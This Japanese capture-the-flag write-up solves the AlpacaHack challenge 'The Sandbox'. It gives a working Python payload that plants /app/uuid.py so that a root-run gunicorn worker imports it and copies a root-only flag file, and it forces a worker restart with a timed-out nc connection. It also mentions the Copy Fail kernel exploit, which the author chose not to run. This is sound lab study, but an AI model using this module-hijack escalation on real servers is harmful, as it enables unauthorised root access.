# The Sandbox

https://alpacahack.com/daily-bside/challenges/the-sandbox

## 問題の概要

送信した Python コードが `nobody` ユーザーで実行される環境で `root` しか読めないフラグファイルを読み取る問題です。

### `POST /`

`/` に Python コードを POST すると次のような処理が行われます。

- ランダムな `run_id` を発行
- コードを `/app/runs/{run_id}/main.py` に保存
- `runuser -u nobody -- python3 /app/runs/{run_id}/main.py` を実行
- 実行結果を `/app/runs/{run_id}/result.txt` に保存
- `/?id={run_id}` にリダイレクト

受け付ける入力は最大 1024 文字までです。

### `GET /`

`/?id={run_id}` にアクセスすると実行結果を確認できます。

```python
run_id = request.args.get("id")
run_dir = f"runs/{run_id}" if run_id else None
if run_dir and os.path.isdir(run_dir):
    code = read_regular_file(f"{run_dir}/main.py")
    result = read_regular_file(f"{run_dir}/result.txt")

run_ids = [name for name in os.listdir("runs") if os.path.isdir(f"runs/{name}")]
return render_template_string(HTML, code=code, result=result, run_ids=run_ids)
```

### 環境

フラグは `/flag-{hash}.txt` に保存されており、`root` 以外は読み取れないようになっています。

`/app/` の permission は `1777` で、`nobody` ユーザーでも読み書きできますが、既存のファイルの移動や削除はできません。

サーバーは [`gunicorn`](https://gunicorn.org/) で 8 つの worker を起動しています。

```dockerfile
WORKDIR /app
RUN mkdir runs && chmod 1777 .
RUN echo "Alpaca{REDACTED}" > /flag.txt && chmod 0400 /flag.txt && mv /flag.txt /flag-$(md5sum /flag.txt | cut -c-32).txt
COPY app.py .
CMD ["gunicorn", "--workers", "8", "--bind", "0.0.0.0:3000", "app:app"]
```

```bash
$ ls -la /flag-*.txt
-r-------- 1 root root 17 May  4 04:00 /flag-********.txt
$ ls -la /app
drwxrwxrwt 1 root   root    4096 May  4 05:28 .
drwxr-xr-x 1 root   root    4096 May  4 05:27 ..
drwxr-xr-x 2 root   root    4096 May  4 05:28 __pycache__
-rw-r--r-- 1 root   root    1983 May  3 09:22 app.py
drwxr-xr-x 1 root   root    4096 May  4 05:28 runs
```

## 方針を考える

最初は見れば見るほど巷で話題の [Copy Fail (CVE-2026-31431)](https://copy.fail/) の問題に見えてしまい、かなり困惑していました。

Copy Fail は AF_ALG のバグによって本来書き換え不可能なページキャッシュをユーザーが書き換えられてしまう脆弱性で、setuid bit で常に root で実行される `su` コマンドの実行ファイルのキャッシュを書き換えることで root 権限で `execve("/bin/sh", null, null)` を実行するエクスプロイトが公開されています。

公開されているエクスプロイトは 732 バイトの Python スクリプトで、一般ユーザーで実行するだけで root 権限を奪取できるため、1024 バイトまでの Python スクリプトを実行してくれる今回の問題の状況にあまりにもマッチしています。

しかし、CTF サーバーとはいえ、あまりにもホンモノの脆弱性すぎて攻撃コードを実行するのはさすがに憚られます。

冷静に考えれば Copy Fail が許容されれば他の問題も成立しなくなるうえ、脆弱性を修正したアップデートが適用されると解けない問題になってしまします。

Spawn 方式のサーバーですが、ページキャッシュは Kernel レベルで共有されており、`/usr/bin/su` のキャッシュを書き換えると同じコンテナイメージから起動している他の参加者のインスタンスにも影響を与えてしまう可能性があるため、Copy Fail の問題を出題するには `qemu` などが必要になりそうです。

少し試してみたい気持ちもありましたが、手を出さずに別の解法を考えることにしました。

### 方針 2: `GET /` でフラグを読み取る

`/?id={run_id}` で読み取るファイルがフラグファイルを指すようにできればフラグを読み取ることができます。

ディレクトリトラバーサルが可能ですが、読み込むパスは `/app/runs/{run_id}/main.py` と `/app/runs/{run_id}/result.txt` なので、直接フラグファイルを読み取ることはできません。

`/app/runs/` 以下は `nobody` ユーザーで書き込みできませんが、`/app/` 直下なら書き込み可能です。

`/app/a/result.txt` に `/flag-{hash}.txt` へのリンクを置ければ `/?id=../a` にアクセスすることでフラグを読み取ることができそうです。

```python
import os
os.mkdir("/app/a")
os.system("touch /app/a/main.py")
os.system("ln /flag-* /app/a/result.txt")
os.system("ls -la /app/a")
```

```
Result:
total 12
drwxr-xr-x 2 nobody nogroup 4096 May  4 07:42 .
drwxrwxrwt 1 root   root    4096 May  4 07:42 ..
-rw-r--r-- 1 nobody nogroup    0 May  4 07:42 main.py
```

残念ながら権限不足でハードリンクは張れないようです。シンボリックリンクなら作成できるのですが、`read_regular_file` 関数はシンボリックリンクをたどらないようになっているため、これも失敗します。

### 方針 3: `app.py` で実行されるコードを書き換える

先日の Daily 問題 [permission denied 2](https://alpacahack.com/daily/challenges/permission-denied-2) のように `app.py` のコードを作り変えることができれば root 権限でコードを実行できますが、今回は `/app/` の権限は `drwxrwxrwt` と Sticky Bit が立っているため、権限がない既存のファイルを削除したり移動したりすることができません。

いろいろ考えた結果、Python では同じディレクトリにあるファイル `{basename}.py` を `import {basename}` でインポートできることに思い当たりました。

`app.py` でインポートされているモジュールと同じ名前のファイルを `/app/` に置いて、`app.py` からインポートされるモジュールを乗っ取ることができれば、root 権限でコードを実行できます。

結果として、この方針で解くことができました。

## 解法

次のコードを送信します。

```python
import os

if __name__ == "__main__":
    os.system(f"cp {__file__} /app/uuid.py")
else:
    with open("/usr/local/lib/python3.14/uuid.py") as f:
        exec(f.read())
    os.makedirs("/app/runs/flag", exist_ok=True)
    os.system("touch /app/runs/flag/main.py")
    os.system("cp /flag* /app/runs/flag/result.txt")
```

`python /app/runs/{run_id}/main.py` で実行されると、自身を `/app/uuid.py` にコピーします。

この状態で gunicorn の worker が起動すると `/app/app.py` が `uuid` モジュールをインポートする際に `/app/uuid.py` がインポートされ、`else` 以降のコードが実行されます。

`uuid.py` が実行された後に `/?id=flag` にアクセスすることでフラグを読み取ることができます。

### gunicorn の worker を再起動させる

さて、`/app/uuid.py` をインポートさせるには gunicorn の worker を再起動させる必要があります。

調べたところ、gunicorn では次のような場合に worker が再起動されるそうです。

- worker を増減・再読み込みさせるシグナルが送られたとき
- worker が一定数のリクエストを処理したとき(メモリリーク対策)
- worker の応答が一定時間以内に返ってこないとき
- worker がクラッシュしたとき

再現性のある形で worker を再起動させるのが難しかったですが、最終的に `nc` で接続してから何も送らずにタイムアウトさせる方法にたどり着き、安定して worker を再起動させることができました。

```bash
$ nc localhost 3000
(30 秒ほど待機)
HTTP/1.1 500 Internal Server Error
Connection: close
...
```

## 感想

あまりにも Copy Fail の要件にマッチしていてびっくりしましたが、おそらくこの問題の作問と同じ時期に作られたであろう permission denied、permission denied 2 の出題日からして全くの偶然のようです。

この3問は似たような permission 関連の問題ですが、それぞれで着地点が異なり、美しい構成だと思いました。
個人的にかなりお気に入りの問題です。
